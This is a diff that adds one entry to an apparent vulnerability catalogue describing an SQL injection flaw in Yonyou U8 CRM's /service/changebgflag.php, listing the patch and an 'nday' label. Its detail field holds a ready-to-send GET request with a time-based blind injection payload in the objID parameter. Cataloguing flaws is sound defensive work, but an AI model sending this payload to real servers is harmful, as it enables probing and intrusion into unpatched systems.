@@ -1,0 +1,11 @@
+vendor = "用友"
+name = "用友U8 CRM changebgflag.php SQL注入漏洞"
+type = "SQL注入"
+path = "/service/changebgflag.php"
+version = ""
+detail = "GET /service/changebgflag.php?UserSessionID=111&objType=1&StopBgFlag=1&objID=1' WAITFOR DELAY '0:0:5'-- HTTP/1.1 Host: target"
+fix = "安装补丁包 250422"
+date = 20260301
+label = "nday"
+cve = "TVD-2026-04361"
+verifier = "AdySec"
